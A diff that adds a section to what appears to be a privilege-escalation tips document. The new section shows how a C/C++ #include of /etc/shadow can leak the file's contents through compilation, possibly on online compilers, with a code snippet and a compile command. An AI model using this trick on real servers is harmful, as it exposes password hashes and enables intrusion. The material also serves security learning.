@@ -35,3 +35,26 @@ ls
 ```
 
 It can be useful when you can't set the bit or you have a capability on `ld-linux` set.
+
+
+### Compile C/C++ including a file
+
+From [@Poita_](https://twitter.com/Poita_/status/1198413809670598662) and [hboeck](https://blog.hboeck.de/archives/898-include-etcshadow.html). You can include a file or even `/dev/stdin`
+when you compile a file. So, it's possible to include `/etc/shadow` if you have
+the correct permissions on the server. Hboeck explains that it's possible to get
+the file from online compiler ([cpp.sh](http://cpp.sh/) may work).
+
+
+```c
+#include <stdio.h>
+int main() {
+  printf("%s\n",
+    #include </etc/shadow>
+  )
+  return 0;
+}
+```
+
+```bash
+$ g++ a.cpp && ./a.out
+```
